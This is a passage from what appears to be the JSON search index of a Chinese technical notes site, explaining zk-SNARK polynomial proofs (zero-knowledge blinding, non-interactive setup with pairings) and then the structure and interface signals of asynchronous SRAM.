\u200b\u662f\u200b\u591a\u9879\u5f0f\u200b \\(p(x)\\) \u200b\u7684\u200b\u9636\u6570\u200b</li> <li>Prover \u200b\u5df2\u77e5\u200b \\(p(s)=t(s)h(s)\\)\uff0c\u200b\u8ba1\u7b97\u200b \\(E(p(s)), E(\\alpha{}p(s)), E(h(s))\\)\uff0c\u200b\u53d1\u9001\u7ed9\u200b Verifier</li> <li>Verifier \u200b\u5224\u65ad\u200b \\(E(p(s))=E(h(s))^{t(s)}\\) \u200b\u4ee5\u53ca\u200b \\(E(p(s))^{\\alpha}=E(\\alpha{}p(s))\\)</li> </ol> <p>\u200b\u8fd9\u6837\u200b\u5c31\u200b\u8bc1\u660e\u200b\u4e86\u200b\u4e24\u70b9\u200b\uff1a</p> <ol> <li>\\(E(p(s))=E(h(s))^{t(s)}\\) \u200b\u8bc1\u660e\u200b\u4e86\u200b \\(t(x)\\) \u200b\u662f\u200b \\(p(x)\\) \u200b\u7684\u200b\u56e0\u5f0f\u200b</li> <li>\\(E(p(s))^{\\alpha}=E(\\alpha{}p(s))\\) \u200b\u8bc1\u660e\u200b\u4e86\u200b \\(p(x)\\) \u200b\u662f\u200b\u4e00\u4e2a\u200b\u591a\u9879\u5f0f\u200b</li> </ol> <p>\u200b\u9700\u8981\u200b\u6ce8\u660e\u200b\u7684\u200b\u662f\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u5e76\u200b\u6ca1\u6709\u200b\u4fdd\u8bc1\u200b Prover \u200b\u6bcf\u6b21\u200b\u7528\u200b\u540c\u4e00\u4e2a\u200b\u591a\u9879\u5f0f\u200b \\(p(x)\\)\uff0c\u200b\u53ea\u662f\u200b\u8bc1\u660e\u200b\u4e86\u200b Prover \u200b\u77e5\u9053\u200b\u4e00\u4e2a\u200b\u6574\u9664\u200b \\(t(x)\\) \u200b\u7684\u200b\u591a\u9879\u5f0f\u200b\uff0c\u200b\u5e76\u4e14\u200b\u6b21\u6570\u200b\u4e0d\u200b\u8d85\u8fc7\u200b \\(d\\)\u3002</p>"},{"location":"cryptography/zk_snark.html#_5","title":"\u96f6\u200b\u77e5\u8bc6","text":"<p>\u200b\u66f4\u8fdb\u4e00\u6b65\u200b\uff0c\u200b\u5982\u679c\u200b\u60f3\u8981\u200b\u8ba9\u200b Verifier \u200b\u5bf9\u200b\u591a\u9879\u5f0f\u200b\u5b9e\u73b0\u200b\u96f6\u200b\u77e5\u8bc6\u200b\uff0c\u200b\u5f88\u200b\u7b80\u5355\u200b\uff1aProver \u200b\u8fd4\u56de\u200b\u7684\u200b\u4e09\u4e2a\u200b\u503c\u200b\uff0c\u200b\u518d\u6c42\u200b\u4e00\u4e2a\u200b\u968f\u673a\u6570\u200b \\(\\delta\\) \u200b\u6b21\u65b9\u200b\uff0c\u200b\u76f8\u5f53\u4e8e\u200b\u591a\u9879\u5f0f\u200b\u7684\u200b\u7cfb\u6570\u200b\u5168\u90e8\u200b\u4e58\u4ee5\u200b \\(\\delta\\)\uff0c\u200b\u90a3\u4e48\u200b\u7ed3\u679c\u200b\u4f9d\u7136\u200b\u6ee1\u8db3\u200b Verifier \u200b\u8981\u200b\u5224\u65ad\u200b\u7684\u200b\u4e24\u4e2a\u200b\u7b49\u5f0f\u200b\uff0c\u200b\u4f46\u662f\u200b Verifier \u200b\u5c31\u200b\u6ca1\u200b\u529e\u6cd5\u200b\u63a8\u65ad\u200b\u591a\u9879\u5f0f\u200b\u5177\u4f53\u200b\u7684\u200b\u7cfb\u6570\u200b\u4e86\u200b\u3002</p> <p>\u200b\u90a3\u4e48\u200b\u96f6\u200b\u77e5\u8bc6\u200b\u8bc1\u660e\u200b\u534f\u8bae\u200b\u53d8\u6210\u200b\u4e86\u200b\uff1a</p> <ol> <li>Verifier \u200b\u751f\u6210\u200b\u968f\u673a\u6570\u200b \\(s\\) \u200b\u548c\u200b \\(\\alpha\\)</li> <li>Verifier \u200b\u8ba1\u7b97\u200b \\(s\\) \u200b\u7684\u200b\u5e42\u6b21\u200b\uff0c\u200b\u518d\u200b\u5e26\u5165\u200b \\(E(v)\\)\uff1a\\(E(s^i) = g^{s^i}\\)</li> <li>Verifier \u200b\u8ba1\u7b97\u200b \\(E(s^i)^{\\alpha} = g^{\\alpha{}s^{i}}\\)</li> <li>Verifier \u200b\u7ed9\u200b Prover \u200b\u53d1\u9001\u200b \\(E(s^0), E(s^1), \\ldots, E(s^d)\\) \u200b\u548c\u200b \\(E(s^0)^{\\alpha}, E(s^1)^{\\alpha}, \\ldots, E(s^d)^{\\alpha}\\)\uff0c\u200b\u5176\u4e2d\u200b \\(d\\) \u200b\u662f\u200b\u591a\u9879\u5f0f\u200b \\(p(x)\\) \u200b\u7684\u200b\u9636\u6570\u200b</li> <li>Prover \u200b\u5df2\u77e5\u200b \\(p(s)=t(s)h(s)\\)\uff0c\u200b\u8ba1\u7b97\u200b \\(E(p(s)), E(\\alpha{}p(s)), E(h(s))\\)</li> <li>Prover \u200b\u751f\u6210\u200b\u968f\u673a\u6570\u200b \\(\\delta\\)\uff0c\u200b\u8ba1\u7b97\u200b \\(E(\\delta{}p(s)), E(\\delta{}\\alpha{}p(s)), E(\\delta{}h(s))\\)\uff0c\u200b\u53d1\u9001\u7ed9\u200b Verifier</li> <li>Verifier \u200b\u5224\u65ad\u200b \\(E(\\delta{}p(s))=E(\\delta{}h(s))^{t(s)}\\) \u200b\u4ee5\u53ca\u200b \\(E(\\delta{}p(s))^{\\alpha}=E(\\delta{}\\alpha{}p(s))\\)</li> </ol>"},{"location":"cryptography/zk_snark.html#_6","title":"\u975e\u200b\u4ea4\u4e92\u5f0f","text":"<p>\u200b\u4e0a\u9762\u200b\u7684\u200b\u96f6\u200b\u77e5\u8bc6\u200b\u8bc1\u660e\u200b\u534f\u8bae\u200b\u662f\u200b\u4ea4\u4e92\u5f0f\u200b\u7684\u200b\uff0c\u200b\u9700\u8981\u200b Verifier \u200b\u53d1\u9001\u200b\u4e00\u4e9b\u200b\u6570\u636e\u200b\uff0cProver \u200b\u518d\u200b\u56de\u590d\u200b\u4e00\u4e9b\u200b\u6570\u636e\u200b\u3002\u200b\u66f4\u200b\u7406\u60f3\u200b\u7684\u200b\u662f\u975e\u200b\u4ea4\u4e92\u5f0f\u200b\u7684\u200b\u8bc1\u660e\u200b\uff0cProver \u200b\u76f4\u63a5\u200b\u751f\u6210\u200b\u4e00\u4e2a\u200b\u8bc1\u660e\u200b\uff0cVerifier \u200b\u968f\u65f6\u200b\u53ef\u4ee5\u200b\u9a8c\u8bc1\u200b\uff0c\u200b\u4e0d\u200b\u9700\u8981\u200b\u4ea4\u4e92\u200b\u3002</p> <p>\u200b\u4e3a\u4e86\u200b\u89e3\u51b3\u200b\u4ea4\u4e92\u200b\u7684\u200b\u95ee\u9898\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u8ba9\u200b Prover \u200b\u505a\u200b\u81ea\u5df1\u200b\u7684\u200b Verifier\uff0c\u200b\u751f\u6210\u200b\u4e00\u4e2a\u200b\u8bc1\u660e\u200b\uff0c\u200b\u7136\u540e\u200b\u628a\u200b\u8bc1\u660e\u200b\u7684\u200b\u7ed3\u679c\u200b\u516c\u5f00\u200b\u3002\u200b\u90a3\u4e48\u200b\u8fd9\u65f6\u5019\u200b\u9700\u8981\u200b\u6709\u200b\u4e24\u70b9\u200b\u6027\u8d28\u200b\uff1aProver \u200b\u81ea\u5df1\u200b\u505a\u200b\u81ea\u5df1\u200b\u7684\u200b Verifier \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4e0d\u80fd\u200b\u4f5c\u5f0a\u200b\uff1b\u200b\u5b9e\u9645\u200b\u7684\u200b Verifier \u200b\u770b\u5230\u200b\u8bc1\u660e\u200b\u7684\u200b\u7ed3\u679c\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u9a8c\u8bc1\u200b\u8fd9\u4e2a\u200b\u8bc1\u660e\u200b\u662f\u200b\u5408\u6cd5\u200b\u7684\u200b\u3002</p> <p>\u200b\u4e3a\u4e86\u200b\u4fdd\u8bc1\u200b\u7b2c\u4e00\u70b9\u200b\uff0c\u200b\u9700\u8981\u200b\u4fdd\u8bc1\u200b Prover \u200b\u4e0d\u80fd\u200b\u64cd\u7eb5\u200b Verifier \u200b\u7684\u200b\u968f\u673a\u200b\u53c2\u6570\u200b \\(s\\) \u200b\u548c\u200b \\(\\alpha\\)\u3002\u200b\u4e00\u4e2a\u200b\u601d\u8def\u200b\u662f\u200b\u8ba9\u200b\u591a\u4e2a\u200b\u6f5c\u5728\u200b\u7684\u200b Verifier \u200b\u5171\u540c\u200b\u7ed9\u51fa\u200b\u4e00\u7ec4\u200b\u968f\u673a\u200b\u53c2\u6570\u200b\uff0c\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u601d\u8def\u200b\u662f\u200b\u4f7f\u7528\u200b\u4e00\u4e9b\u200b\u4e0d\u200b\u53ef\u9006\u200b\u7684\u200b\u51fd\u6570\u200b\uff0c\u200b\u4f8b\u5982\u200b\u5bc6\u7801\u5b66\u200b\u54c8\u5e0c\u200b\u51fd\u6570\u200b\uff0c\u200b\u8f93\u5165\u200b\u591a\u9879\u5f0f\u200b\u7684\u200b\u4e00\u4e9b\u200b\u4fe1\u606f\u200b\uff0c\u200b\u628a\u200b\u8f93\u51fa\u200b\u7684\u200b\u54c8\u5e0c\u200b\u89c6\u4e3a\u200b\u968f\u673a\u6570\u200b\uff0c\u200b\u8fd9\u6837\u200b\u4fdd\u8bc1\u200b\u4e86\u200b\u968f\u673a\u6027\u200b\uff0c\u200b\u53c8\u200b\u65e0\u6cd5\u200b\u6307\u5b9a\u200b\u968f\u673a\u200b\u53c2\u6570\u200b\u3002</p> <p>\u200b\u4e3a\u4e86\u200b\u4fdd\u8bc1\u200b\u7b2c\u4e8c\u70b9\u200b\uff0c\u200b\u9700\u8981\u200b\u4fdd\u8bc1\u200b\u6240\u6709\u4eba\u200b\u90fd\u200b\u53ef\u4ee5\u200b\u5b8c\u6210\u200b\u9a8c\u8bc1\u200b\u7684\u200b\u90a3\u200b\u4e00\u6b65\u200b\uff0c\u200b\u56de\u987e\u200b\u524d\u9762\u200b\u7684\u200b\u534f\u8bae\u200b\uff0c\u200b\u6700\u540e\u200b\u9700\u8981\u200b\u9a8c\u8bc1\u200b\u7684\u200b\u662f\u200b\uff1a</p> <ol> <li>\\(E(\\delta{}p(s))=E(\\delta{}h(s))^{t(s)}\\)</li> <li>\\(E(\\delta{}p(s))^{\\alpha}=E(\\delta{}\\alpha{}p(s))\\)</li> </ol> <p>\u200b\u4f46\u662f\u200b\u8fd9\u4e2a\u200b\u9a8c\u8bc1\u200b\u8fc7\u7a0b\u200b\u9700\u8981\u200b\u77e5\u9053\u200b \\(t(s)\\) \u200b\u548c\u200b \\(\\alpha\\) \u200b\u7684\u200b\u503c\u200b\uff0c\u200b\u4f46\u200b\u5982\u679c\u200b\u662f\u200b\u91c7\u7528\u200b\u524d\u9762\u200b\u6240\u8bf4\u200b\u7684\u200b\u968f\u673a\u200b\u751f\u6210\u200b\u7684\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u90a3\u4e48\u200b\u8fd9\u200b\u4e24\u4e2a\u200b\u503c\u200b\u662f\u200b\u4e0d\u80fd\u200b\u516c\u5f00\u200b\u7684\u200b\uff0c\u200b\u5426\u5219\u200b Prover \u200b\u5c31\u200b\u53ef\u4ee5\u200b\u9488\u5bf9\u200b\u5b83\u200b\u53bb\u200b\u751f\u6210\u200b\u6570\u636e\u200b\u3002\u200b\u89e3\u51b3\u200b\u65b9\u6cd5\u200b\u662f\u200b\uff0c\u200b\u8bbe\u8ba1\u200b\u4e00\u4e2a\u200b\u201c\u200b\u4e58\u6cd5\u200b\u201d\uff08\u200b\u4e0b\u9762\u200b\u7528\u200b \\(\\times\\) \u200b\u8868\u793a\u200b\uff09\uff0c\u200b\u4f7f\u5f97\u200b\u9a8c\u8bc1\u200b\u8fc7\u7a0b\u200b\u4e0d\u200b\u9700\u8981\u200b\u539f\u59cb\u200b\u7684\u200b \\(t(s)\\) \u200b\u548c\u200b \\(\\alpha\\)\uff0c\u200b\u800c\u662f\u200b\u9700\u8981\u200b \\(E(t(s))\\) \u200b\u548c\u200b \\(E(\\alpha)\\)\uff1a</p> <ol> <li>\\(E(\\delta{}p(s))=E(\\delta{}h(s))^{t(s)}\\) \u200b\u5bf9\u5e94\u200b \\(g^{\\delta{}p(s)} \\times g = g^{t(s)} \\times g^{\\delta{}h(s)}\\)</li> <li>\\(E(\\delta{}p(s))^{\\alpha}=E(\\delta{}\\alpha{}p(s))\\) \u200b\u5bf9\u5e94\u200b \\(g^{\\delta{}p(s)} \\times g^{\\alpha} = g^{\\delta{}\\alpha{}p(s)} \\times g\\)</li> </ol> <p>\u200b\u90a3\u4e48\u200b\u9a8c\u8bc1\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u53ea\u200b\u9700\u8981\u200b \\(E(t(s))=g^{t(s)}\\)\uff0c\\(E(\\alpha)=g^{\\alpha}\\) \u200b\u548c\u200b \\(g\\)\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u9a8c\u8bc1\u200b\u7ed3\u679c\u200b\u662f\u5426\u200b\u6b63\u786e\u200b\uff0c\u200b\u4e0d\u200b\u9700\u8981\u200b\u77e5\u9053\u200b \\(s\\) \u200b\u548c\u200b \\(\\alpha\\) \u200b\u7684\u200b\u5177\u4f53\u200b\u503c\u200b\u3002</p> <p>\u200b\u8fd9\u4e2a\u200b\u4e58\u6cd5\u200b\u662f\u200b\u4e00\u4e2a\u200b\u53cc\u7ebf\u6027\u200b\u7684\u200b\u6620\u5c04\u200b\uff0c\u200b\u53eb\u505a\u200b pairing\u3002</p> <p>\u200b\u90a3\u4e48\u200b\u5230\u200b\u8fd9\u91cc\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u7ed9\u51fa\u200b\u4e00\u4e2a\u200b\u5b8c\u6574\u200b\u7684\u200b\u975e\u200b\u4ea4\u4e92\u5f0f\u200b\u7684\u200b\u591a\u9879\u5f0f\u200b\u96f6\u70b9\u200b\u8bc1\u660e\u200b\uff1a</p> <ol> <li>\u200b\u5df2\u77e5\u200b\u591a\u9879\u5f0f\u200b \\(t(x)\\) \u200b\u548c\u200b\u6b21\u6570\u200b \\(d\\)</li> <li>\u200b\u521d\u59cb\u5316\u200b\u9636\u6bb5\u200b<ol> <li>\u200b\u751f\u6210\u200b\u968f\u673a\u6570\u200b \\(s\\) \u200b\u548c\u200b \\(\\alpha\\)</li> <li>\u200b\u8ba1\u7b97\u200b \\(g^{s^i}, g^{\\alpha{}s^i}, g^{\\alpha}, g^{t(s)}\\)</li> <li>\u200b\u8bb0\u200b\u5176\u4e2d\u200b\u7684\u200b \\(g^{s^i}, g^{\\alpha{}s^i}\\) \u200b\u4e3a\u200b Proving Key\uff0c\u200b\u7528\u4e8e\u200b Prover \u200b\u751f\u6210\u200b Proof</li> <li>\u200b\u8bb0\u200b\u5176\u4e2d\u200b\u7684\u200b \\(g^{\\alpha}, g^{t(s)}\\) \u200b\u4e3a\u200b Verification Key\uff0c\u200b\u7528\u4e8e\u200b Verifier \u200b\u9a8c\u8bc1\u200b Proof</li> </ol> </li> <li>\u200b\u8bc1\u660e\u200b\u9636\u6bb5\u200b<ol> <li>\u200b\u8ba1\u7b97\u200b \\(h(x) = p(x) / t(x)\\)</li> <li>\u200b\u7528\u200b \\(g^{s^i}\\) \u200b\u8ba1\u7b97\u200b \\(g^{p(s)}\\) \u200b\u548c\u200b \\(g^{h(s)}\\)</li> <li>\u200b\u7528\u200b \\(g^{\\alpha{}s^i}\\) \u200b\u8ba1\u7b97\u200b \\(g^{\\alpha{}p(s)}\\)</li> <li>\u200b\u751f\u6210\u200b\u968f\u673a\u6570\u200b \\(\\delta\\)</li> <li>\u200b\u8ba1\u7b97\u200b \\(g^{\\delta{}p(s)}, g^{\\delta{}h(s)}, g^{\\delta{}\\alpha{}p(s)}\\)</li> </ol> </li> <li>\u200b\u9a8c\u8bc1\u200b\u9636\u6bb5\u200b<ol> <li>\u200b\u68c0\u67e5\u200b \\(g^{\\delta{}\\alpha{}p(s)} \\times g = g^{\\delta{}p(s)} \\times g^{\\alpha}\\)</li> <li>\u200b\u68c0\u67e5\u200b \\(g^{\\delta{}p(s)} \\times g = g^{t(s)} \\times g^{\\delta{}h(s)}\\)</li> </ol> </li> </ol>"},{"location":"cryptography/zk_snark.html#_7","title":"\u901a\u7528\u200b\u96f6\u200b\u77e5\u8bc6\u200b\u8bc1\u660e","text":"<p>\u200b\u4e0a\u9762\u200b\u7684\u200b\u96f6\u200b\u77e5\u8bc6\u200b\u8bc1\u660e\u200b\u53ea\u200b\u9002\u7528\u200b\u4e8e\u200b\u591a\u9879\u5f0f\u200b\u7684\u200b\u96f6\u70b9\u200b\u95ee\u9898\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5bf9\u4e8e\u200b\u66f4\u200b\u5e7f\u6cdb\u200b\u7684\u200b\u573a\u666f\u200b\uff0c\u200b\u4f8b\u5982\u200b\u524d\u9762\u200b\u63d0\u5230\u200b\u7684\u200b\u94f6\u884c\u5b58\u6b3e\u200b\u7684\u200b\u95ee\u9898\u200b\uff0c\u200b\u5982\u4f55\u200b\u5b9e\u73b0\u200b\u5462\u200b\uff1f</p> <p>\u200b\u601d\u8def\u200b\u662f\u200b\u628a\u200b\u95ee\u9898\u200b\u8f6c\u5316\u200b\u4e3a\u200b\u524d\u9762\u200b\u7684\u200b\u591a\u9879\u5f0f\u200b\u96f6\u70b9\u200b\u95ee\u9898\u200b\uff0c\u200b\u5177\u4f53\u65b9\u6cd5\u200b\u8be6\u89c1\u200b\u53c2\u8003\u8d44\u6599\u200b\u3002</p>"},{"location":"cryptography/zk_snark.html#_8","title":"\u53c2\u8003\u8d44\u6599","text":"<ul> <li>Why and How zk-SNARK Works: Definitive Explanation</li> </ul>"},{"location":"hardware/async_sram.html","title":"\u5f02\u6b65\u200b SRAM","text":""},{"location":"hardware/async_sram.html#_1","title":"\u7279\u70b9","text":"<p>\u200b\u5f02\u6b65\u200b SRAM \u200b\u7684\u200b\u7279\u70b9\u200b\uff1a</p> <ol> <li>\u200b\u63a5\u53e3\u200b\u7b80\u5355\u200b\uff1a\u200b\u63a7\u5236\u5668\u200b\u7ed9\u51fa\u200b\u5730\u5740\u200b\u548c\u200b\u63a7\u5236\u200b\u4fe1\u53f7\u200b\uff0c\u200b\u7ecf\u8fc7\u200b\u56fa\u5b9a\u200b\u5ef6\u8fdf\u200b\u540e\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5f97\u5230\u200b\u6570\u636e\u200b\uff0c\u200b\u4e0d\u200b\u9700\u8981\u200b\u6821\u51c6\u200b</li> <li>\u200b\u63d0\u4f9b\u200b MB \u200b\u7ea7\u522b\u200b\u7684\u200b RAM\uff1a\u200b\u5355\u82af\u7247\u200b\u53ef\u4ee5\u200b\u63d0\u4f9b\u200b KB \u200b\u5230\u200b MB \u200b\u7ea7\u522b\u200b\u7684\u200b RAM\uff0c\u200b\u901a\u8fc7\u200b\u5e76\u8054\u200b\u591a\u4e2a\u200b SRAM\uff0c\u200b\u53ef\u4ee5\u200b\u5f97\u5230\u200b\u66f4\u5927\u200b\u7684\u200b\u5bb9\u91cf\u200b</li> <li>\u200b\u9ad8\u901f\u200b\u5f02\u6b65\u200b SRAM \u200b\u5ef6\u8fdf\u200b\u5728\u200b 10ns \u200b\u7684\u200b\u7ea7\u522b\u200b</li> </ol>"},{"location":"hardware/async_sram.html#_2","title":"\u7ed3\u6784","text":"<p>\u200b\u5f02\u6b65\u200b SRAM \u200b\u5185\u90e8\u200b\u4ee5\u200b\u4e00\u4e2a\u200b\u6570\u7ec4\u200b\u7684\u200b\u5f62\u5f0f\u200b\u4fdd\u5b58\u200b\u6570\u636e\u200b\u3002\u200b\u4f8b\u5982\u200b\u4e00\u4e2a\u200b 2048K x 16 \u200b\u7684\u200b\u5f02\u6b65\u200b SRAM\uff0c\u200b\u6709\u200b 2048K \u200b\u4e2a\u884c\u200b\uff0c\u200b\u6bcf\u884c\u200b\u4fdd\u5b58\u200b\u4e86\u200b 16 \u200b\u4f4d\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u603b\u5171\u200b\u4fdd\u5b58\u200b\u4e86\u200b \\(2048\\mathrm{K} * 16\\mathrm{b} = 32 \\mathrm{Mb}\\) \u200b\u7684\u200b\u6570\u636e\u200b\u3002</p> <p>\u200b\u5f02\u6b65\u200b SRAM \u200b\u7684\u200b\u7ed3\u6784\u200b\u89c1\u56fe\u200b 1\u3002\u200b\u63a7\u5236\u5668\u200b\u5728\u200b\u8bbf\u95ee\u200b\u5f02\u6b65\u200b SRAM \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u7ed9\u51fa\u200b\u4e00\u4e2a\u200b\u884c\u200b\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u5f02\u6b65\u200b SRAM \u200b\u5c31\u200b\u4f1a\u200b\u8bfb\u53d6\u200b\u4e00\u884c\u200b\u7684\u200b\u6570\u636e\u200b\u3002\u200b\u7531\u4e8e\u200b\u4e00\u5171\u200b\u6709\u200b 2048K \u200b\u4e2a\u884c\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5730\u5740\u200b\u9700\u8981\u200b\u7684\u200b\u4f4d\u6570\u200b\u662f\u200b \\(\\log_2(2048\\mathrm{K})=21\\)\uff0c\u200b\u5bf9\u5e94\u200b\u4e0b\u56fe\u200b\u7684\u200b <code>A0-A20</code>\u3002\u200b\u5730\u5740\u200b\u901a\u8fc7\u200b <code>DECODER</code>\uff0c\u200b\u4ece\u200b\u6570\u7ec4\u200b\u4e2d\u200b\u53d6\u51fa\u200b\u8981\u200b\u8bbf\u95ee\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u653e\u5230\u200b <code>COLUMN IO</code> \u200b\u4e2d\u200b\u3002</p> <p> </p> \u200b\u5f02\u6b65\u200b SRAM \u200b\u7684\u200b\u7ed3\u6784\u200b\u6846\u56fe\u200b\uff08\u200b\u56fe\u6e90\u200b ISSI Datasheet\uff09 <p>\u200b\u5bf9\u4e8e\u200b\u8bfb\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u5185\u5b58\u200b\u63a7\u5236\u5668\u200b\u5728\u200b <code>A0-A20</code> \u200b\u4e0a\u200b\u63d0\u4f9b\u200b\u5730\u5740\u200b\uff0c\u200b\u7ecf\u8fc7\u200b <code>DECODER</code> \u200b\u4ece\u200b <code>2048K x 16 MEMORY ARRAY</code> \u200b\u4e2d\u200b\u8bfb\u53d6\u6570\u636e\u200b\u5230\u200b <code>COLUMN IO</code>\uff0c\u200b\u63a7\u5236\u200b\u903b\u8f91\u200b <code>CONTROL CIRCUIT</code> \u200b\u6839\u636e\u200b\u8bfb\u200b\u64cd\u4f5c\u200b\uff08<code>WE#=1, OE#=0</code>\uff09\uff0c\u200b\u628a\u200b\u6570\u636e\u200b\u8f93\u51fa\u200b\u5230\u200b <code>I/O DATA CIRCUIT</code>\u3002</p> <p>\u200b\u5bf9\u4e8e\u200b\u5199\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u5185\u5b58\u200b\u63a7\u5236\u5668\u200b\u5728\u200b <code>A0-A20</code> \u200b\u4e0a\u200b\u63d0\u4f9b\u200b\u5730\u5740\u200b\uff0c\u200b\u5728\u200b <code>I/O</code> \u200b\u4e0a\u200b\u63d0\u4f9b\u200b\u8981\u200b\u5199\u5165\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u5728\u200b <code>UB#/LB#</code> \u200b\u4e0a\u200b\u63d0\u4f9b\u200b\u5b57\u8282\u200b\u4f7f\u80fd\u200b\u3002\u200b\u5f02\u6b65\u200b SRAM \u200b\u4ece\u200b <code>MEMORY ARRAY</code> \u200b\u4e2d\u200b\u8bfb\u53d6\u200b\u6570\u7ec4\u200b\u4e2d\u200b\u73b0\u6709\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u7ed3\u5408\u200b <code>UB#/LB#</code> \u200b\u4e0e\u200b <code>I/O</code>\uff0c\u200b\u8ba1\u7b97\u200b\u51fa\u65b0\u200b\u7684\u200b\u503c\u200b\uff0c\u200b\u518d\u200b\u5199\u5165\u200b\u5185\u5b58\u200b\u3002\u200b\u5176\u4e2d\u200b <code>UB#</code> \u200b\u548c\u200b <code>LB#</code> \u200b\u5206\u522b\u200b\u662f\u200b\u9ad8\u200b 8 \u200b\u4f4d\u200b\u548c\u200b\u4f4e\u200b 8 \u200b\u4f4d\u200b\u7684\u200b\u5b57\u8282\u200b\u4f7f\u80fd\u200b\uff08\u200b\u4f4e\u200b\u6709\u6548\u200b\uff09\u3002\u200b\u5982\u679c\u200b\u65e7\u200b\u6570\u636e\u200b\u662f\u200b <code>1234</code>\uff0c\u200b\u5185\u5b58\u200b\u63a7\u5236\u5668\u200b\u8981\u200b\u5199\u5165\u200b\u7684\u200b\u503c\u200b\u662f\u200b <code>5678</code>\uff0c\u200b\u90a3\u4e48\u200b\u5185\u5b58\u200b\u4e2d\u200b\u7684\u200b\u503c\u200b\u66f4\u65b0\u200b\u4e3a\u200b\uff1a</p> UB# LB# \u200b\u7ed3\u679c\u200b \u200b\u89e3\u91ca\u200b 0 0 5678 \u200b\u5168\u90e8\u200b\u91c7\u7528\u200b\u65b0\u503c\u200b 1 0 1278 \u200b\u4ec5\u200b\u5199\u5165\u200b\u4f4e\u5b57\u8282\u200b 0 1 5634 \u200b\u4ec5\u200b\u5199\u5165\u200b\u9ad8\u5b57\u8282\u200b 1 1 1234 \u200b\u5168\u90e8\u200b\u91c7\u7528\u200b\u65e7\u503c"},{"location":"hardware/async_sram.html#_3","title":"\u63a5\u53e3","text":"<p>\u200b\u5f02\u6b65\u200b SRAM \u200b\u66b4\u9732\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u5355\u53e3\u200b RAM \u200b\u63a5\u53e3\u200b\uff0c\u200b\u540c\u65f6\u200b\u53ea\u80fd\u200b\u8fdb\u884c\u200b\u8bfb\u200b\u6216\u8005\u200b\u5199\u200b\u5176\u4e2d\u200b\u4e00\u4e2a\u200b\u64cd\u4f5c\u200b\u3002\u200b\u5178\u578b\u200b\u7684\u200b\u5f02\u6b65\u200b SRAM \u200b\u5305\u62ec\u200b\u5982\u4e0b\u200b\u7684\u200b\u4fe1\u53f7\u200b\uff1a</p> <ol> <li>\u200b\u5730\u5740\u200b\u4fe1\u53f7\u200b A\uff1a\u200b\u4f4d\u6570\u200b\u6839\u636e\u200b\u6df1\u5ea6\u200b\u51b3\u5b9a\u200b\uff0c\u200b\u4f8b\u5982\u200b 2048K \u200b\u7684\u200b\u6df1\u5ea6\u200b\u5bf9\u5e94\u200b 21 \u200b\u4f4d\u200b\u5730\u5740\u200b</li> <li>\u200b\u6570\u636e\u4fe1\u53f7\u200b I/O\uff1a\u200b\u4f4d\u6570\u200b\u7b49\u4e8e\u200b\u5bbd\u5ea6\u200b\uff0c\u200b\u4f8b\u5982\u200b 8 \u200b\u6216\u200b 16 \u200b\u4f4d\u200b</li> <li>\u200b\u7247\u9009\u200b\u4fe1\u53f7\u200b CS#\uff08\u200b\u6216\u8005\u200b\u53eb\u200b CE#\uff09\uff1a\u200b\u4f4e\u200b\u6709\u6548\u200b\uff0cCS# \u200b\u7b49\u4e8e\u200b 0 \u200b\u65f6\u200b\u5de5\u4f5c\u200b</li> <li>\u200b\u8f93\u51fa\u200b\u4f7f\u80fd\u200b\u4fe1\u53f7\u200b OE#\uff1a\u200b\u4f4e\u200b\u6709\u6548\u200b\uff0cOE# \u200b\u7b49\u4e8e\u200b 0 \u200b\u65f6\u200b SRAM \u200b\u8f93\u51fa\u200b\uff0cOE# \u200b\u7b49\u4e8e\u200b 1 \u200b\u65f6\u200b SRAM \u200b\u8f93\u5165\u200b</li> <li>\u200b\u5199\u200b\u4f7f\u200b\u80fd\u200b\u4fe1\u53f7\u200b WE#\uff1a\u200b\u4f4e\u200b\u6709\u6548\u200b\uff0cWE# \u200b\u7b49\u4e8e\u200b 0 \u200b\u65f6\u5199\u200b\uff0cWE# \u200b\u7b49\u4e8e\u200b 1 \u200b\u65f6\u8bfb\u200b</li> <li>\u200b\u5b57\u8282\u200b\u4f7f\u80fd\u200b\u4fe1\u53f7\u200b UB#/LB#\uff1a\u200b\u4f4e\u200b\u6709\u6548\u200b\uff0c\u200b\u5bf9\u5e94\u200b\u4e24\u4e2a\u200b\u5b57\u8282\u200b\uff0c\u200b\u7b49\u4e8e\u200b 0 \u200b\u65f6\u200b\u66f4\u65b0\u200b\uff0c\u200b\u7b49\u4e8e\u200b 1 \u200b\u65f6\u200b\u4e0d\u53d8\u200b</li> </ol> <p>\u200b\u4e00\u4e9b\u200b\u5f02\u6b65\u200b SRAM \u200b\u7684\u200b\u5bbd\u5ea6\u200b\u662f\u200b 8 \u200b\u4f4d\u200b\uff0c\u200b\u6b64\u65f6\u200b\u6ca1\u6709\u200b\u5b57\u8282\u200b\u4f7f\u80fd\u200b\u4fe1\u53f7\u200b\u3002</p>"},{"location":"hardware/async_sram.html#_4","title":"\u62fc\u63a5","text":"<p>\u200b\u5982\u679c\u200b\u60f3\u8981\u200b\u66f4\u200b\u5927\u5bb9\u91cf\u200b\u7684\u200b\u5f02\u6b65\u200b SRAM\uff0c\u200b\u53ef\u4ee5\u200b\u62fc\u63a5\u200b\u591a\u4e2a\u200b\u5f02\u6b65\u200b 